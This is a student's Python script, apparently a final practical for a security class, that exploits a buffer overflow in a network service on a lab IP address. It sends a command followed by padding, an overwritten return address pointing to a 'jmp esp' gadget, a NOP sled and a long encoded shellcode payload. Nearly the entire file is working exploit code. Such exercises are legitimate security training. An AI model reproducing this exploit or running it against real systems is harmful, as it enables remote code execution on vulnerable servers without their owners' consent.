#Python script to exploit server
#NAME: Griffin Pundt
#CLASS: CSEC201
#ASSIGNMENT: Final Practical

import socket

ip = "192.168.204.33"   	 #ip of server
port = 2221   		 #port we will be connecting on
command = b'INC '
EIP = b"\x5c\xf7\x63\x77"    #memory address of 'jmp esp' (written in reverse)
nop = b'\x90'*20   	 #NOP sled
length = 28   		 #length of garbage needed
garbage = 'A'*length

buf =  b""
buf += b"\xda\xd6\xbf\xed\x87\x2c\xa0\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x56\x83\xed\xfc\x31\x7d\x14\x03\x7d\xf9\x65"
buf += b"\xd9\x5c\xe9\xe8\x22\x9d\xe9\x8c\xab\x78\xd8\x8c\xc8"
buf += b"\x09\x4a\x3d\x9a\x5c\x66\xb6\xce\x74\xfd\xba\xc6\x7b"
buf += b"\xb6\x71\x31\xb5\x47\x29\x01\xd4\xcb\x30\x56\x36\xf2"
buf += b"\xfa\xab\x37\x33\xe6\x46\x65\xec\x6c\xf4\x9a\x99\x39"
buf += b"\xc5\x11\xd1\xac\x4d\xc5\xa1\xcf\x7c\x58\xba\x89\x5e"
buf += b"\x5a\x6f\xa2\xd6\x44\x6c\x8f\xa1\xff\x46\x7b\x30\xd6"
buf += b"\x97\x84\x9f\x17\x18\x77\xe1\x50\x9e\x68\x94\xa8\xdd"
buf += b"\x15\xaf\x6e\x9c\xc1\x3a\x75\x06\x81\x9d\x51\xb7\x46"
buf += b"\x7b\x11\xbb\x23\x0f\x7d\xdf\xb2\xdc\xf5\xdb\x3f\xe3"
buf += b"\xd9\x6a\x7b\xc0\xfd\x37\xdf\x69\xa7\x9d\x8e\x96\xb7"
buf += b"\x7e\x6e\x33\xb3\x92\x7b\x4e\x9e\xfa\x48\x63\x21\xfa"
buf += b"\xc6\xf4\x52\xc8\x49\xaf\xfc\x60\x01\x69\xfa\xf1\x05"
buf += b"\x8a\xd4\xb9\x46\x74\xd5\xb9\x4f\xb3\x81\xe9\xe7\x12"
buf += b"\xaa\x62\xf8\x9b\x7f\x1e\xf2\x0b\x40\x76\xcf\xcf\x28"
buf += b"\x84\xd0\xde\xf4\x01\x36\xb0\x54\x41\xe7\x71\x05\x21"
buf += b"\x57\x1a\x4f\xae\x88\x3a\x70\x65\xa1\xd1\x9f\xd3\x99"
buf += b"\x4d\x39\x7e\x51\xef\xc6\x55\x1f\x2f\x4c\x5f\xdf\xfe"
buf += b"\xa5\x2a\xf3\x17\xd2\xd4\x0b\xe8\x77\xd4\x61\xec\xd1"
buf += b"\x83\x1d\xee\x04\xe3\x81\x11\x63\x70\xc5\xee\xf2\x40"
buf += b"\xbd\xd9\x60\xec\xa9\x25\x65\xec\x29\x70\xef\xec\x41"
buf += b"\x24\x4b\xbf\x74\x2b\x46\xac\x24\xbe\x69\x84\x99\x69"
buf += b"\x02\x2a\xc7\x5e\x8d\xd5\x22\xdd\xca\x29\xb0\xca\x72"
buf += b"\x41\x4a\x4b\x83\x91\x20\x4b\xd3\xf9\xbf\x64\xdc\xc9"
buf += b"\x40\xaf\xb5\x41\xca\x3e\x77\xf0\xcb\x6a\xd9\xac\xcc"
buf += b"\x99\xc2\x5f\xb6\xd2\xf5\xa0\x47\xfb\x91\xa1\x47\x03"
buf += b"\xa4\x9e\x91\x3a\xd2\xe1\x21\x79\xed\x54\x07\x28\x64"
buf += b"\x96\x1b\x2a\xad"

#create connection to server
sock = socket.socket()
sock.connect((ip, port))
print(sock.recv(1024).decode()) #recieve server's welcome message"

#exploting
try:
    bad_str = command + garbage.encode() + EIP + nop + buf
    sock.send(bad_str)
    print(f"RESPONSE to bad_str with length {length}: ")
    print(sock.recv(1024).decode())
except:
    print(f"Server broke with length {length}\n")

print("closing")
sock.close()
